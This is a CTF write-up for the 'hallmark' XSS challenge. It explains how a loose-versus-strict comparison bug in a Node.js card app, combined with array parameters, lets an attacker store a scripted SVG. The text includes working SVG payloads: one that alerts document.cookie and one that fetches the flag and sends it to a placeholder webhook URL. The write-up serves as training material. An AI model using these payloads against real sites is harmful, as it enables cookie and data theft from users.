![image](https://user-images.githubusercontent.com/64314534/234540425-1f4a28ba-cf8c-4fdc-8bf0-30444beb81d6.png)

<br>

### From the description we can guess it's a Xss Challenge and we had the source code also, so let's try to see the challenge first then try to understand the source code 

<br>

![image](https://user-images.githubusercontent.com/64314534/234540812-325aac3c-d36d-4656-bb61-247bdcf54dda.png)

<br>

### The challenge takes an input from us so, let's try simple payload like : `<h1> test </h1>` in the `content` input

<br>

![image](https://user-images.githubusercontent.com/64314534/234541362-4aee29de-8707-434c-b597-87892d6b6109.png)

<br>

### After click on `Send Card` button, it  will redirect us to `/card?id=uuid_of_the_card` 
<br>

![image](https://user-images.githubusercontent.com/64314534/234541248-74e056e8-1652-4ec6-b21e-7b743d2069aa.png)

<br>

### But as you see, it seems to be filtered so i tried to see the request at burp suite 

<br>

![image](https://user-images.githubusercontent.com/64314534/234542524-911c12ea-4bc3-4b40-86e2-344358107ff7.png)

<br>

### There are two parameters one called `svg` and another one called `content` so i sent the request and redirected to the card 

<br>

![image](https://user-images.githubusercontent.com/64314534/234542840-f29e5a0c-c23f-4b38-8687-612f4050371c.png)

<br>

### As you can see the content is not filtered but the browser didn't parse the Html content because the `Content-Type` response header is set to `text/plain; charset=utf-8` so, the browser will handle it as a normal text  but i got noticed that's a parameter called `svg` in the request and as we know can get xss using svg so, let's back to the index page to see how this svg handeled.

<br>


![image](https://user-images.githubusercontent.com/64314534/234547113-ef4d455a-47c4-471a-b473-8e040c3c6424.png)

<br>

![image](https://user-images.githubusercontent.com/64314534/234547211-017ba358-d1ed-4c8e-aaea-c3ee5b57f867.png)

<br>

### You can see from the previous imgs that you can choose some shapes from the type list like [Heart,Cake,...etc]. and you can enter text only if you choosed `Custom Text`

<br><br>

# Enough blindly testing and let's start reviewing the App code (nodejs)

<br>

### We had many files but we only need to review `index.js`

<br>

![image](https://user-images.githubusercontent.com/64314534/234550939-aa8d92a5-f2a5-4d2f-86d3-78d450f5eb0b.png)

<br>

![image](https://user-images.githubusercontent.com/64314534/234551998-46020b78-1d87-42e6-b5e6-04e114091357.png)

<br>

### From the first part of the code you can see some interested things like 
 -  `app.use(bodyParser.urlencoded({ extended: true }));` that will allow the application to accept objects in request parameters 
 -  IMAGES Object that many files you can access is based on the key like : `IMAGES[heart]` will return the svg image : `./static/heart.svg`
 -  The IMAGES Object is freezed so no one can edit or append anything to it
 -  Initate Cards  Object   

<br>

### The application following the REST api workflow :
- GET  : view something
- POST : add something
- PUT  : edit something
- Delete : remove something

![image](https://user-images.githubusercontent.com/64314534/234554067-9fd25163-f06a-4309-be49-8cf67a596f15.png)


### We will explain each part 
<br>

![image](https://user-images.githubusercontent.com/64314534/234554993-cf3fa6e4-ce3c-4b10-a1ac-87d98933c490.png)

<br>

### The GET part will do the following :
- Check if the user provides `id` parameter `/card?id=`
- Check if the Cards Object had this id in it's keys 
- IF this card id exist it will return it's type as a `Content-Type` response header and it's content as a response body
- IF this card id is not exist it will send "bad id" as a response body

<br>

![image](https://user-images.githubusercontent.com/64314534/234556298-03ae4936-2d30-429c-b630-4ccb787e21fc.png)

<br>

### The POST part will do the follwing :
- Will take svg,content variables from the request body   `svg=&content` // same as the data we saw in the add card request
- Declare the type variabe to be `text/plain` and id variable to had a UUID v4 value
- IF the `svg` is `text` the type will still `text/plain` and will save the card[id] value to be an Object contains the type and content that we provided //cards[id] = { type, content }
- IF the `svg` is not `text` the type will be `image/svg+xml` and the content will be the value of this svg in IMAGES Object 
//cards[id] = { type, content: IMAGES[svg] }
- After adding the card the server will redirects us to `/card?id=uuid_of_the_card`

### We all know that we can get xss from uploading svg but here we can't control the svg img so, let's move to PUT part

<br>

![image](https://user-images.githubusercontent.com/64314534/234564599-ae5670cd-3e64-47d2-a137-3898bc9bc8bb.png)

<br>

### The PUT part will do the following :
- Will take id,type,svg,content variables from the request body `id=&type=&svg=&content=`
- IT will check if the cards Object had card with this id and if not it will sends `bad id`
- The card type will be `image/svg+xml` if the type parameter in the request was `image/svg+xml` and if else it will be `text/plain`
- The card content will be the file content in the IMAGES Object that had the key of `svg` parameter that we sent in the request 
Ex : `cake: fs.readFileSync("./static/cake.svg")` so, if the `svg` parameter had value `cake` the content will be the content of `cake.svg` file
if the value of type was `image/svg+xml`
- IF the value of type parameter wasn't `image/svg+xml` the content will be the value of `content` parameter

<br>

We can simplifiy it in this form

```js
    if(type=="image/svg+xml") // for the type
    {
        cards[id].type=type
    }
    else
    {
        cards[id].type="text/plain"
    }

    if(type==="image/svg+xml") // for the content 
    {
        cards[id].content=IMAGES[svg || "heart"];
    }
    else
    {
        cards[id].content=content
    }

```

<br>

### But the interesing part here is the comparison method of each part 

It's clear now that we need to control the content and in the same time we need the type to be `image/svg+xml` but if we put it in type the application will get the content of the card from the IMAGES Object that we can't control so, let's take a look at the comparison part 
<br>

![image](https://user-images.githubusercontent.com/64314534/234568155-6dcb88ec-c4c5-4ac7-869b-920ff8498953.png)

<br>

The condition in the type part is `==` ( Loose comparison ) and in the content part is `===` ( Strict comparison ) so, let's try to see how we can bypass the first part to be true and the second part to be false to make the type `image/svg+xml` and also control the content part

- The `==` will return true if the two parts had the same value even in diffrent data types and `===` should had the same data type 
So, we just had to provide the `type` parameter in any data type rather string and since  `app.use(bodyParser.urlencoded({ extended: true }));` as i mentioned before so, we can provide type parameter as an object like this : 
- `id=id_of_the_card&type[]=image/svg%2bxml&content=svg_content`
It's easy to get a svg xss payload like this :
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('XSS\n'+document.domain+'\n'+document.cookie);
   </script>
</svg>
```
<br>

And then we will go to our card to view it's content like :
https://hallmark.web.actf.co/card?id=93a17e08-bd94-43ca-9620-45cab9d075a8

<br>

![image](https://user-images.githubusercontent.com/64314534/234572184-6d09c454-0949-4620-95e2-fd5aeb584efb.png)

<br>


and we can clearly see that our svg is injected and the content type is as we wish also so, let's try to open it in browser to see the alert :

<br>

![image](https://user-images.githubusercontent.com/64314534/234572278-95e52456-699a-42cc-bd97-f8fadad69adf.png)

<br>

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
     fetch('/flag').then(flag=>flag.text()).then(flag => fetch('your_webhook_url/?c='+flag))
   </script>
</svg>
```

### And we got the flag
<br>

![image](https://user-images.githubusercontent.com/64314534/234574769-c4ff180d-97ac-4625-a4c5-e406cad94ccb.png)






